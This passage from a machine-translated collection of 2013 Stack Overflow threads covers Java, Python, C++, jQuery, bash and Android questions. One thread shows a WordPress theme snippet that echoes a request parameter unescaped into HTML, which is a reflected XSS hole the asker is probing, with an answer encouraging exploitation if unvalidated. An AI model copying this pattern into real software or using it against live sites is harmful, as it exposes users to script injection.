如果您有任何问题并且想将检票口添加到现有项目中，只需复制 web..xml 检票口罐子，您就会拥有检票口项目（我会从另一个连接您现有服务的 opm 推荐检票口，这样可以将服务与网络分离容器 ...）

P. S 他们刚刚继承了 WebApplication 的东西并称为 ExampleWebApplication

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-09T17:16:24.997

你能做的最好的就是使用 maven 集成

1.  安装 Eclipse（支持 Java EE）
2.  添加所有必需的 maven 相关插件

    *   版本控制：使用 Subclipse 1.8.x，参见：[http ://subclipse.tigris.org/update_1.8.x](http://subclipse.tigris.org/update_1.8.x)

    *   Maven 集成： m2e ，包含在 Eclipse Classic 中。使用Help->Install New Software，选择“--All available sites--”并选择Collaboration -> m2e - Maven Integration for Eclipse

    *   Subclipse/Maven 集成：更新站点：[http ://subclipse.tigris.org/m2eclipse/1.0/](http://subclipse.tigris.org/m2eclipse/1.0/)

然后，只需查看您在网络上获得的 Maven 示例

转到 Eclipse--窗口--> 显示视图--> 其他

输入 svn 并选择 SVN 存储库并打开它

然后复制签出地址，添加到svn repositories View

最后，右键单击您添加的链接并作为 maven 项目签出。

如果你想创建新的 Maven 项目

创建新的maven项目，new-->project-->Maven项目

然后在新的 Maven 项目窗口中，在 Filer Text 框中，键入 wicket 并选择**org.apche.wicket 作为 groupID** 之后，您可以让您的 maven 代码正常工作。

如果仍然遇到一些调试错误，您可以打开**pom.xml**文件并添加依赖项，例如**wicket-core**和**wicket-extensions**

# php - 为什么这个 PHP 代码不能被利用？

> ID：15845401
> 
> 赞同：0
> 
> 时间：2013-04-05T23:53:55.097
> 
> 标签：php, wordpress

社区，

我正在审查一个 WordPress 主题的漏洞，我相信我偶然发现了一个，但由于某种原因，它没有执行整个脚本或其他东西。

这是代码：

```
<span style="display: none;" id="hooks"><?php echo json_encode(of_get_header_classes_array()); ?></span>
<input type="hidden" id="reset" value="<?php if(isset($_REQUEST['reset'])) echo $_REQUEST['reset']; ?>" /> 
```

但由于某种原因，脚本停止执行，只打印一些代码，源代码如下所示：

```
<span style="display: none;" id="hooks"> 
```

而且它永远不会关闭 span 标签。我想知道为什么会这样。

这是功能：

```
function of_get_header_classes_array() 
{

global $of_options;

foreach ($of_options as $value) 
{
    if ($value['type'] == 'heading')
        $hooks[] = str_replace(' ','',strtolower($value['name']));  
}

return $hooks;
} 
```

任何人都知道为什么我不能执行 XSS 是我将代码注入 $_REQUEST['reset'] 吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-05T23:58:55.020

我猜你在 of_get_header_classes_array 中遇到了一个错误。检查您的错误日志并确保 error_reporting 已打开？

至于这是否可利用，可能会在代码前面的重置参数上进行验证。如果绝对没有验证，你可以去镇上就可以了。

# python - 下载网页源至关键字

> ID：15845403
> 
> 赞同：0
> 
> 时间：2013-04-05T23:54:16.397
> 
> 标签：python

我正在寻找从网站下载特定关键字的源代码（这些网站都来自论坛，所以我只对第一个帖子用户详细信息的源代码感兴趣）所以我只需要下载源代码直到我第一次在源代码中找到“<!-- message, attachments, sig -->”。

[如何在不下载所有页面源的情况下获取网页标题](https://stackoverflow.com/questions/11652883/how-to-get-webpage-title-without-downloading-all-the-page-source)

这个问题虽然使用不同的语言，但与我想要做的事情非常相似，尽管我对 python 没有那么丰富的经验，所以我不知道如何将答案重新编码成 python。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-06T01:33:01.477

首先，请注意，在您取消之前，您可能已经将每个页面的全部或大部分放入您的操作系统缓冲区、NIC、路由器或 ISP，因此这样做可能根本没有任何好处。并且会产生成本——如果你提前关闭它们，你就不能重用它们；`recv`如果您想提早取消，您必须一次只取小件；等等

如果您对可能需要读取多少字节有一个粗略的了解（最好经常超过一点，而不是有时会下降一点），并且服务器处理 HTTP 范围请求，您可能想尝试一下，而不是请求整个文件，然后提前关闭套接字。

但是，如果您想知道如何提前关闭套接字：

`urllib2.urlopen`,`requests`和大多数其他高级库都是围绕您想要读取整个文件的想法设计的。它们在数据进入时缓冲数据，为您提供高级文件式界面。最重要的是，他们的 API 是阻塞的。这两者都不是你想要的。您希望尽可能快地获取传入的字节，并且当您关闭套接字时，您希望尽可能快地获得它们`recv`。

因此，您可能需要考虑使用 Python 包装器之一`libcurl`，它可以让您在功能/灵活性和易用性之间取得很好的平衡。例如，使用`pycurl`：

```
import pycurl

buf = ''

def callback(newbuf):
    global buf
    buf += newbuf
    if '<div style="float: right; margin-left: 8px;">' in buf:
        return 0
    return len(newbuf)

c = pycurl.Curl()
c.setopt(c.URL, 'http://curl.haxx.se/dev/')
c.setopt(c.WRITEFUNCTION, callback)
try:
    c.perform()
except Exception as e:
    print(e)
c.close()

print len(buf) 
```

事实证明，这最终在该测试中读取了 12259/12259 字节。但是，如果我将其更改为前 2650 个字节的字符串，我只会读取 2650/12259 个字节。如果我启动 Wireshark 和 instrument `recv`，我可以看到，虽然下一个数据包确实到达了我的 NIC，但我从未真正阅读过它；我收到 2650 个字节后立即关闭了套接字。所以，这*可能会*节省一些时间……虽然可能不会太多。不过，更重要的是，如果我将它扔到一个 13MB 的图像文件并尝试在 1MB 之后停止，我只会收到几 KB 的额外，而且大部分图像甚至还没有到达我的路由器（尽管它可能已经全部离开服务器，如果你关心对服务器友好的话），这样肯定*会*节省一些时间。

当然，典型的论坛页面更接近 12KB 而不是 13MB。（例如，即使在我漫无目的之后，这个页面也远低于 48KB。）但也许您正在处理非典型论坛。

如果页面真的很大，您可能希望将代码更改为`buf[-len(needle):] + newbuf`每次只检查而不是整个缓冲区。即使使用 13MB 的图像，一遍又一遍地搜索整个内容并没有增加多少总运行时间，但它*确实*将我的 CPU 使用率从 1% 提高到了 9%……</p>

最后一件事：如果你正在阅读，比如说，500 页，同时阅读它们——比如，一次 8 个——可能会比仅仅提前取消每一页为你节省更多的时间。两者一起可能比单独使用更好，所以这不是反对这样做的论据 - 这只是一个建议这样*做*。[`receiver-multi.py`](http://pycurl.cvs.sourceforge.net/viewvc/pycurl/pycurl/examples/retriever-multi.py)（如果您想让自己处理并发，请参阅示例`curl`……或者只是使用`multiprocessing`或`concurrent.futures`使用子进程池。）

# .net - 回发之间的会话变量不匹配

> ID：15845406
> 
> 赞同：0
> 
> 时间：2013-04-05T23:55:00.757
> 
> 标签：.net, timeout, postback, session-variables, tabbed-browsing

我正在存储一个会话变量，我用它作为参数传递给各种数据访问调用。此变量在首次创建会话时设置，用户可以根据他们有权访问的资源进行更改。例如，当用户第一次登录时，他们的默认会话值可能设置为“1”。在页面的右上角是他们可以访问的所有选项的下拉列表，更改此选项会更改会话变量... 1、2、3、4...等。

问题是由于以下原因之一，此会话变量可能会在回发之间发生变化：

1.  会话超时，导致会话重新创建自己，默认值为 1
2.  用户打开两个选项卡/浏览器窗口并在一个选项卡上更改它，然后切换回另一个使用“1”作为值呈现的页面

这会导致页面上的控件变得“陈旧”并且回发行为不正确。在其事件处理程序中依赖于会话变量的按钮单击事件可能不是“预期”事件，并且界面具有误导性。

我想要做的是确定会话变量的值是否在回发之间发生了变化，以及它是否已重定向回同一页面，导致它使用新的会话变量值重新呈现，并为用户提供清楚地表明每个回发实际上做了什么。

有任何想法吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-06T00:46:19.900

为什么不使用 cookie 来存储该变量？我认为你的两个问题都可以解决。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-08T17:05:07.360

我最终做的是在我的母版页中添加一个 HiddenField，然后将其放入后面的代码中：

```
 if (!Page.IsPostBack)
        {
            //SelectedID comes from masterpage property (Session variable)
            hiddenField.Value = SelectedID.ToString();

            ...
        }
        else
        {
            int selectedId = Int32.Parse(hiddenField.Value);
            if (selectedId != SelectedID)
            {
                Response.Redirect(Request.RawUrl);
            }
        } 
```

# java - 尝试更改 Java 版本时，OSX 上的符号链接搞砸了

> ID：15845411
> 
> 赞同：1
> 
> 时间：2013-04-05T23:55:35.723
> 
> 标签：java, macos, symlink

我做了坏事请帮忙。

我是在：

```
/System/Library/Frameworks/JavaVM.framework/Versions 
```

我被告知运行以下命令：

```
sudo ln -fhsv 1.6 CurrentJDK 
```

这把一切都搞砸了：

```
lrwxr-xr-x   1 root  wheel   10  5 Apr 20:57 1.4 -> CurrentJDK
lrwxr-xr-x   1 root  wheel   10  5 Apr 20:57 1.4.2 -> CurrentJDK
lrwxr-xr-x   1 root  wheel   10  5 Apr 20:57 1.5 -> CurrentJDK
lrwxr-xr-x   1 root  wheel   10  5 Apr 20:57 1.5.0 -> CurrentJDK
lrwxr-xr-x   1 root  wheel   10  5 Apr 20:57 1.6 -> CurrentJDK
lrwxr-xr-x   1 root  wheel   10  5 Apr 20:57 1.6.0 -> CurrentJDK
drwxr-xr-x   8 root  wheel  272  5 Apr 20:57 A
lrwxr-xr-x   1 root  wheel    1  5 Apr 20:57 Current -> A
lrwxr-xr-x   1 root  wheel    3  6 Apr 00:22 CurrentJDK -> 1.6 
```

我怎样才能恢复它，使它`1.6`不是符号链接？这是以前的目录。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-05T23:59:55.657

我的目录如下所示：

```
$ ls -l /System/Library/Frameworks/JavaVM.framework/Versions
total 64
lrwxr-xr-x  1 root  wheel   10 Mar 11 20:37 1.4 -> CurrentJDK
lrwxr-xr-x  1 root  wheel   10 Mar 11 20:37 1.4.2 -> CurrentJDK
lrwxr-xr-x  1 root  wheel   10 Mar 11 20:37 1.5 -> CurrentJDK
lrwxr-xr-x  1 root  wheel   10 Mar 11 20:37 1.5.0 -> CurrentJDK
lrwxr-xr-x  1 root  wheel   10 Mar 11 20:37 1.6 -> CurrentJDK
lrwxr-xr-x  1 root  wheel   10 Mar 11 20:37 1.6.0 -> CurrentJDK
drwxr-xr-x  8 root  wheel  272 Mar 11 20:37 A
lrwxr-xr-x  1 root  wheel    1 Mar 11 20:37 Current -> A
lrwxr-xr-x  1 root  wheel   59 Mar 11 20:37 CurrentJDK -> /System/Library/Java/JavaVirtualMachines/1.6.0.jdk/Contents 
```

这样做：

```
sudo -s
cd /System/Library/Frameworks/JavaVM.framework/Versions
ln -sf /System/Library/Java/JavaVirtualMachines/1.6.0.jdk/Contents 1.6 
```

# bash - 将命令输出分配给变量并在返回值上执行 if 分支

> ID：15845412
> 
> 赞同：0
> 
> 时间：2013-04-05T23:55:45.283
> 
> 标签：bash

我想做以下事情

```
X=$(some_command)
if [ $? == 0 ]; then
  do_something
  echo $x
else
  do_something_else
fi 
```

基本上，我想执行一些命令，将输出存储到某个变量。同时，我想根据命令是否成功进行分支。上述方式有效，但看起来很难看。这是一种更聪明的方式吗？

谢谢。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-04-05T23:59:03.083

```
if x=$(some command); then
  do_something
  echo $x
else
  do_something_else
fi 
```

该`if`命令的工作原理是运行命令并测试它是否成功，并根据它执行`then`or分支。`else`

# python - 如何将参数传递给 datetime.timedelta

> ID：15845414
> 
> 赞同：4
> 
> 时间：2013-04-05T23:55:57.403
> 
> 标签：python, datetime, python-3.x

我们已经知道， datetime.timedelta(hours= 5) 是一种正确的语法。如何传递一个可以替换下面函数中给出的“小时”的参数？

```
 def check_time(until_when, def_time, how_long):
            if until_when- datetime.datetime.now() > datetime.timedelta(def_time = how_long):
            input('Task has been finished.\nPress any key to quit\n')
            exit() 
```

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2013-04-05T23:59:55.523

```
def check_time(until_when, def_time, how_long):
    arg_dict = {def_time:how_long}
    dt = datetime.timedelta(**arg_dict)
    if until_when- datetime.datetime.now() > dt:
        input('Task has been finished.\nPress any key to quit\n')
        exit() 
```

请参阅[了解 Python 中的 kwargs](https://stackoverflow.com/questions/1769403/understanding-kwargs-in-python)和[教程。](http://docs.python.org/2/tutorial/controlflow.html#keyword-arguments)

# scala - 读取行期间的 Source.fromInputStream 异常处理

> ID：15845422
> 
> 赞同：2
> 
> 时间：2013-04-05T23:57:02.327
> 
> 标签：scala, file-io, exception-handling, iterator, inputstream

我创建了一个函数，我将输入流作为参数并返回一个由字符串组成的迭代器。我按如下方式完成此操作：

```
def lineEntry(fileInputStream:InputStream):Iterator[String] = {
   Source.fromInputStream(fileInputStream).getLines()
} 
```

我使用的方法如下：

```
val fStream = getSomeInputStreamFromSource()
lineEntry(fStream).foreach{
  processTheLine(_)
} 
```

现在，如果 lineEntry 方法在使用 foreach 遍历输入流时遇到错误字符，很有可能会崩溃。

有哪些方法可以应对这种情况？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-04-06T00:16:05.420

快速解决方案（适用于 Scala 2.10）：

```
def lineEntry(fileInputStream:InputStream):Iterator[String] = {
  implicit val codec = Codec.UTF8 // or any other you like
  codec.onMalformedInput(CodingErrorAction.IGNORE)

  Source.fromInputStream(fileInputStream).getLines()
} 
```

在 Scala 2.9 中有一个小的区别：

```
implicit val codec = Codec(Codec.UTF8) 
```

`Codec`还有一些配置选项，您可以在这种情况下调整其行为。

# jquery - 让 Jquery 在可放置和可拖动中排序

> ID：15845423
> 
> 赞同：4
> 
> 时间：2013-04-05T23:57:19.027
> 
> 标签：jquery, jquery-ui-sortable, jquery-ui-droppable

我目前正在开发一个功能，我需要同时结合可放置、可拖动和可排序的功能。下面是我的测试代码。很抱歉，我无法为这段代码获取 jsfiddle。Droppable 和 Draggable 工作正常。

问题：我很难在可放置的 div 中进行水平排序。如果有人可以帮助/指导我将其与排序列表中元素的索引/位置一起获取，我将不胜感激，无论该元素位于第 1、第 2 等位置。

HTML：

```
 <ul id="gallery" class="gallery ui-helper-reset ui-helper-clearfix">
          <li class="ui-widget-content ui-corner-tr">
            <div class="ui-widget-header">High Tatras 1</div>
          </li>
          <li class="ui-widget-content ui-corner-tr">
            <div class="ui-widget-header">High Tatras 2</div>
          </li>
          <li class="ui-widget-content ui-corner-tr">
            <div class="ui-widget-header">High Tatras 3</div>
          </li>
          <li class="ui-widget-content ui-corner-tr">
            <div class="ui-widget-header">High Tatras 4</div>
          </li>
        </ul>

        <div id="trash" class="ui-widget-content ui-state-default">
            <ul id = "sortable" class='gallery ui-helper-reset sortable'></ul>
        </div> 
```

以上是我用作测试数据的 HTML 代码。

JQuery：下面是我目前使用的 Jquery 代码。

```
 var $gallery = $( "#gallery" ),
                   $trash = $( "#trash" );

                 // let the gallery items be draggable
                 $( "li", $gallery ).draggable({
                   cancel: "a.ui-icon", // clicking an icon won't initiate dragging
                   revert: "invalid", // when not dropped, the item will revert back to its initial position
                   containment: "document",
                   helper: "clone",
                   cursor: "move"
                 });

                 // let the trash be droppable, accepting the gallery items
                 $trash.droppable({
                   accept: "#gallery > li",
                   activeClass: "ui-state-highlight",
                   drop: function( event, ui ) {
                     addToContainer( ui.draggable );
                   }
                 });

                 // let the gallery be droppable as well, accepting items from the trash
                 $gallery.droppable({
                   accept: "#trash li",
                   activeClass: "custom-state-active",
                   drop: function( event, ui ) {
                     RemoveFromContainer( ui.draggable );
                   }
                 });

                 function addToContainer( $item ) {
                   $item.fadeOut(function() {
                     var $list = $( "ul", $trash );

                     $item.appendTo($list).fadeIn(function() {
                       $item
                         .addClass('ui-state-default')
                         .find( "div .ui-widget-header" )
                           .animate({ height: "36px"});
                     });
                   });

                   $( ".sortable" ).sortable({
                       connectWith: "#sortable"
                   }).disableSelection();

                 }

                 function RemoveFromContainer( $item ) {
                   $item.fadeOut(function() {
                     $item
                       .find( "a.ui-icon-refresh" )
                         .remove()
                       .end()
                       .css( "width", "96px")
                       .find( "img" )
                         .css( "height", "72px" )
                       .end()
                       .appendTo( $gallery )
                       .fadeIn();
                   });
                 }

                 // resolve the icons behavior with event delegation
                 $( "ul.gallery > li" ).click(function( event ) {

                   var $item = $( this ),
                     $target = $( event.target );

                   if ( $target.is( "a.ui-icon-trash" ) ) {
                     addToContainer( $item );
                   } else if ( $target.is( "a.ui-icon-refresh" ) ) {
                     RemoveFromContainer( $item );
                   }

                   return false;
                 }); 
```

如果我遗漏了什么并且未能发布正确的问题，请告诉我。我对stackoverflow进行了一些研究，但仍然找不到确切的解决方案。非常感谢您提前。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-06T04:36:43.533

使用 2`sortable`并将`connectWith`属性设置为彼此：

```
var $gallery = $("#gallery"),
    $trash = $("#trash");
$("#gallery").sortable({
    connectWith: "#trash",
    helper: "",
    revert: "invalid",
    start: function (event, ui) {
        var $item = ui.helper;
        $item.css({
            'width': $('#gallery li').width()
        });
    },
    stop: function (event, ui) {
       //get what you want here
    }
});

$('#trash').sortable({
    placeholder: "ui-state-highlight",
    connectWith: '#gallery',
    revert: true,
    cursor: "move",
    items: "li",
    drop: function (event, ui) {

    },
    stop: function (event, ui) {
        var $obj = $(ui.item);
       //get what you want here
    }
}); 
```

尝试工作小提琴：

[http://jsfiddle.net/mw3Pn/2/](http://jsfiddle.net/mw3Pn/2/)

# stack-overflow - istream 未处理的异常，堆栈溢出

> ID：15845428
> 
> 赞同：0
> 
> 时间：2013-04-05T23:58:29.557
> 
> 标签：stack-overflow, unhandled-exception, istream

我对 C++ 相当陌生，并且正在尝试让 istream 工作。我有一类：

```
class rat
{
private:
    int num;
    int denom;
public:

    rat();
    rat(const int&, const int&);
    rat(const int&);

    friend ostream& operator << (ostream&, const rat&);
    friend istream& operator >> (istream&, const rat&);
};
rat::rat(void)
{
    num = 0;
    denom = 1;
}

rat::rat(const int &n, const int &d)
{
    num = n;
    denom = d;
    simplify();
}

rat::rat(const int &n)
{
    num = n;
    denom = 1;
}

ostream& operator << (ostream &os, const rat &r1)
{
    os << r1.num;
    os << "/";
    os << r1.denom;
    return os;
}

istream& operator >> (istream &is, const rat &r1)
{
    is >> r1.num;
    is >> r1.denom;
    return is;
} 
```

我还有一个 .cpp：

```
#include <iostream>
#include <conio.h>
using namespace std;
#include "Rats.h"

void main()
{
    rat r1(3,4), r2(2,3), r3;

    system("cls");
    cout << "Please enter a rational number: ";
    cin >> r3;
} 
```

每当遇到“is >> r1.num;”时，我的问题就会出现。线。它给了我错误：RatClass.exe 中 0x772d15de 处的未处理异常：0xC00000FD：堆栈溢出。

同样，我还很新，所以还没有知道可能的原因是什么。任何帮助表示赞赏。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-06T02:23:28.613

看起来这可能是你正在接受的事实，`const rat &r1`但通过从你发送数据`istream`你会改变`r1`。你不能改变常数。不确定这是否是问题，但这是首先想到的明显的事情。

试试这个：

```
istream& operator >> (istream &is, rat &r1)
{
    is >> r1.num;
    is >> r1.denom;
    return is;
} 
```

**不要忘记在课堂上更改您的定义：**

```
friend istream& operator >> (istream&, rat&); 
```

# eclipse - 在 Eclipse 中用不同的定义替换宏？

> ID：15845437
> 
> 赞同：0
> 
> 时间：2013-04-05T23:59:18.503
> 
> 标签：eclipse, eclipse-cdt

我正在开发一个定义如下全局变量的项目：

```
// Define an correctly-sized array of pointers to avoid static initialization.
// Use an array of pointers instead of an array of char in case there is some alignment issue.
#define DEFINE_GLOBAL(type, name, ...) \
    void * name[(sizeof(type) + sizeof(void *) - 1) / sizeof(void *)]; 
```

这显然工作正常，但会导致 Eclipse 将这些全局变量之一的每一次使用都显示为错误。

我希望它是这样的：

```
#define DEFINE_GLOBAL(type, name, ...) \
    type name; 
```

但是我不能更改这个文件，那么有没有办法告诉 Eclipse 假装这是宏的定义？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-18T16:45:39.157

如果您`#define`在初始（不需要的）定义之后首选定义，Eclipse 在执行动态宏扩展时似乎使用最新定义。

因此，如果您重新`#define`编辑正在编辑的文件中的宏，这可能会解决您的问题。

诚然这是一个杂项，可能会导致无法预料的问题，但它可能对您的实施有用。

# java - 在 Java 中找到我目前的职位

> ID：15845439
> 
> 赞同：0
> 
> 时间：2013-04-05T23:59:28.147
> 
> 标签：java, android, geolocation, location

我以前从未使用过 android 包，我只想得到我现在的位置。在网上看了一会儿，我已经走到了这一步。

```
import android.location.Location;
import android.location.LocationManager; 
import android.content.*;

public class CurPosGetter{

public static double[] getPosition(){
    LocationManager lm = (LocationManager)getSystemService(Context.LOCATION_SERVICE); 
    Location location = (Location) lm.getLastKnownLocation(LocationManager.GPS_PROVIDER);
    double longitude = location.getLongitude();
    double latitude = location.getLatitude();
    double[] ans = new double[2];
    ans[0] = latitude;
    ans[1] = longitude;
    return ans;
}

public static void main (String [] args){
    double[] pos = getPosition();
    System.out.println(pos[0] + " , " + pos[1]);
}

} 
```

问题出在'getSystemService'行：通过阅读上下文的javadocs，我了解到通过结合调用此方法`Context.LOCATION_SERVICE`可以获得我当前的位置，但我真的不明白如何调用getSystemService。任何帮助将不胜感激，我确信这是一个简单的问题，我只是不了解我正在使用的类。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-06T00:03:27.253

getSystemService() 是 Context 类的方法。您的类没有子类上下文。*通常，您会在 Activity（它是*Context 的子类）中使用 getSystemService( )。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-06T00:06:45.340

我认为您指的是编译器错误，例如“未找到方法 getSystemService”。getSystemService 与在您的应用程序中获得的 Context 类一起保存。查看这篇文章以了解如何获取 Context。

[在 Android 上获取“上下文”的静态方法？](https://stackoverflow.com/questions/2002288/static-way-to-get-context-on-android)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-06T00:05:44.503

[这](http://developer.android.com/guide/topics/location/index.html)是Android中位置服务的概述。[这](http://developer.android.com/reference/android/location/LocationManager.html)是`LocationManager`Android 中定位服务的核心类。

[这](https://developer.android.com/guide/topics/location/strategies.html)是关于“位置策略”的 Android 开发者教程。[这](http://blogoscoped.com/archive/2008-12-15-n14.html)是另一个可能有用的教程。

此外，您不能只向 Android 询问您当前的位置，因为 GPS 可能需要相当长的时间才能得到修复。相反，您需要请求位置更新并使用您获得的第一个更新或类似模式。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-04-06T07:47:10.753

试试这个工作代码，在 SEMC Xperia Play 中测试

```
public class CLASSNAME extends Activity //Use your class name(It will done automatically in eclipse when you start a project)
{

 private LocationManager 
 locationManagerNetwork;

 @Override

 public void onCreate(Bundle savedInstanceState)

 {

  super.onCreate(savedInstanceState);

  setContentView(R.layout.main);

  locationManagerNetwork = (LocationManager) getSystemService(Context.LOCATION_SERVICE);

  android.location.Location location2 = locationManagerNetwork.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);

  if (location2 != null) 
   {       

    String message = String
.format("Yout location : \n Longitude: %1$s \n Latitude: %2$s",
location2.getLongitude(), location2.getLatitude());

 File sdcard = Environment.getExternalStorageDirectory();

       {

        try
         {

          FileWriter filenew = new FileWriter(sdcard + "/FOLDERNAME/network.txt");
 //Use your folder name                   
          BufferedWriter bw = new BufferedWriter(filenew);

          bw.write(message);

          bw.close();

         }

        catch (IOException e) 
         {

         }}}}} 
```

# c++ - 无法为我的自定义类的对象赋值，其行为类似于矩阵

> ID：15845443
> 
> 赞同：0
> 
> 时间：2013-04-06T00:00:04.810
> 
> 标签：c++

我有自定义类，其行为类似于矩阵。一切都很好，除了从同一类的其他实例分配一个值。

所以我可以做这样的事情：

```
Matrix a(5,7);
// du stuff with a
Matrix b(5,7);
Matrix d=a+b;
d=a*5;
d[3][2]=1;

//but I can't do this:
double x=d[3][2];

//at this point I get this error: 
```

`main.cpp:604:12: error: passing ‘const Matrix’ as ‘this’ argument of ‘Matrix::Proxy Matrix::operator[](int)’ discards qualifiers`

有谁知道，如何解决这个问题？:(

我的矩阵类的实现在这里：

```
class Matrix {
public:

Matrix(int x, int y);
~Matrix(void);
//overloaded operators
Matrix operator+(const Matrix &matrix) const;  
Matrix operator-() const;
Matrix operator-(const Matrix &matrix) const; 
Matrix operator*(const double x) const; 
Matrix operator*(const Matrix &matrix) const; 

friend istream& operator>>(istream &in, Matrix& a);

class Proxy {
    Matrix& _a;
    int _i;
public:

    Proxy(Matrix& a, int i) : _a(a), _i(i) {

    }

    double& operator[](int j) {
        return _a._arrayofarrays[_i][j];
    }
};

Proxy operator[](int i) {
    return Proxy(*this, i);
}

// copy constructor

Matrix(const Matrix& other) : _arrayofarrays() {
    _arrayofarrays = new double*[other.x ];
    for (int i = 0; i != other.x; i++)
        _arrayofarrays[i] = new double[other.y];

    for (int i = 0; i != other.x; i++)

        for (int j = 0; j != other.y; j++)
            _arrayofarrays[i][j] = other._arrayofarrays[i][j];

    x = other.x;
    y = other.y;
}
int x, y;
double** _arrayofarrays;
}; 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-06T00:37:32.237

您目前只有一个`operator[]`签名：

```
Proxy operator[](Matrix *this, int i) 
```

你试图这样称呼：

```
Proxy operator[](const Matrix *, int) 
```

错误是说为了从 to 转换`const Matrix *`，`Matrix *`必须`const`丢弃 ，这很糟糕。您应该`const`在课堂上提供一个版本：

```
Proxy operator[](int) const {...} 
```

在您的类中，它获得第一个参数`this`，`const`参数列表之后意味着第一个参数将是指向您的类的常量对象的指针，而不是非常量对象。

# ruby-on-rails - 几分钟后自动删除记录

> ID：15845446
> 
> 赞同：0
> 
> 时间：2013-04-06T00:00:17.450
> 
> 标签：ruby-on-rails, activerecord, timeout

我将按照[第一个问题](https://stackoverflow.com/questions/15830212/showing-if-someone-is-reading-a-post/15830340#15830340)`timeout`中的建议使用。所以如果一个人查看了一个帖子，他就会被记录到正在查看同一帖子的人列表中，并且这个记录会在一段时间后（例如5分钟）过期。

有人建议我使用`cache`来实现这一点，但我想我会尝试使用 Rails 关联来做到这一点，如下所示。

`post has_many readers`

而在`PostsController#Show`

`@post.readers.create(user: current_user)` **我需要让这条记录在 5 分钟后过期，这样 current_user 就会自动从 post.readers 中删除。**

这是正确的方法吗？另外，如何设置`Reader`模型以便在创建 5 分钟后删除任何记录？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-06T00:10:13.730

您可以在执行查询时检索最新的读者：

```
post.readers.where('created_at >= ?', 5.minutes.ago) 
```

然后你可以有一个后台作业来进行清理。

# windows - 64 位 Windows 中缺少的地址空间

> ID：15845449
> 
> 赞同：3
> 
> 时间：2013-04-06T00:01:00.737
> 
> 标签：windows, memory, x86-64

在今天的 x86-64 处理器中，可用地址空间为 48 位长，并被分成两半。一种是从 00000000`00000000 到 00007fff`ffffffff，另一种是从 ffff8000`00000000 到 ffffffff`ffffffff。

现在我正在编写一个程序来捕获内存访问冲突。这是我的代码。

```
UINT64 *Test1 = (UINT64 *) 0x0000000000000000;
UINT64 Test2;
AddVectoredExceptionHandler(TRUE,(PVECTORED_EXCEPTION_HANDLER)ExceptionHandler);
Test2 = *Test1; 
```

`ExceptionHandler`是一个[VEH 异常处理程序](http://msdn.microsoft.com/en-us/library/windows/desktop/ms681419%28v=vs.85%29.aspx)。我可以在[ExceptionInfo](http://msdn.microsoft.com/en-us/library/windows/desktop/ms679331%28v=vs.85%29.aspx) -> [ExceptionRecord](http://msdn.microsoft.com/en-us/library/windows/desktop/aa363082%28v=vs.85%29.aspx) ->ExceptionInformation[1] 中获取无法访问的地址（第二个数组元素指定了无法访问的数据的虚拟地址。（[此处](http://msdn.microsoft.com/en-us/library/windows/desktop/aa363082%28v=vs.85%29.aspx)））。在这种情况下，它是 0，与 Test1 相同。

如果您尝试访问 00007fff`ffffffff 和 ffff8000`00000000 之间的任何地址，则 ExceptionInfo->ExceptionRecord->ExceptionInformation[1] 将为 -1。这并不出乎我的意料。但有趣的是，当我在 Test1 中输入 0x00007fffffffffff 时，我也得到了 -1。没多久我发现从00007fff`fffffff8到00007fff`ffffffff也返回-1，应该是系统中的合法地址。

有人可以向我解释一下吗？

# c++ - BST 上的“未解析的外部符号 public：__thiscall”，很可能是由于模板

> ID：15845454
> 
> 赞同：0
> 
> 时间：2013-04-06T00:02:02.990
> 
> 标签：c++, templates, tree, binary-search-tree, external

好吧，我尝试通过网络寻找解决方案，但找不到任何解决我问题的方法。

我正在为班级写一个作业，让我们使用模板进行二叉树搜索。我已经在之前的课程中构建了一个整数二叉搜索树，所以这主要是同一个程序，只是做了一些调整（最重要的是模板）。上一课中的程序运行得非常好，但是在应用模板之后，它给了我一组非常奇怪的错误：

```
1>tester.obj : error LNK2019: unresolved external symbol "public: __thiscall binTree<int>::~binTree<int>(void)" (??1?$binTree@H@@QAE@XZ) referenced in function _main
1>tester.obj : error LNK2019: unresolved external symbol "public: void __thiscall binTree<int>::deleteNode(int const &)" (?deleteNode@?$binTree@H@@QAEXABH@Z) referenced in function _main
1>tester.obj : error LNK2019: unresolved external symbol "public: bool __thiscall binTree<int>::find(int const &)" (?find@?$binTree@H@@QAE_NABH@Z) referenced in function _main
1>tester.obj : error LNK2019: unresolved external symbol "public: int __thiscall binTree<int>::height(void)" (?height@?$binTree@H@@QAEHXZ) referenced in function _main
1>tester.obj : error LNK2019: unresolved external symbol "public: void __thiscall binTree<int>::postorderTraversal(void)" (?postorderTraversal@?$binTree@H@@QAEXXZ) referenced in function _main
1>tester.obj : error LNK2019: unresolved external symbol "public: void __thiscall binTree<int>::preorderTraversal(void)" (?preorderTraversal@?$binTree@H@@QAEXXZ) referenced in function _main
1>tester.obj : error LNK2019: unresolved external symbol "public: void __thiscall binTree<int>::inorderTraversal(void)" (?inorderTraversal@?$binTree@H@@QAEXXZ) referenced in function _main
1>tester.obj : error LNK2019: unresolved external symbol "public: void __thiscall binTree<int>::insert(int const &)" (?insert@?$binTree@H@@QAEXABH@Z) referenced in function _main
1>tester.obj : error LNK2019: unresolved external symbol "public: __thiscall binTree<int>::binTree<int>(void)" (??0?$binTree@H@@QAE@XZ) referenced in function _main 
```

我的代码在 BTS 类的标头、带有函数的 cpp 文件和 cpp 测试器之间分解。

**BinTree.h：**

```
#pragma once
#include <iostream>
#include <string>
using namespace std;

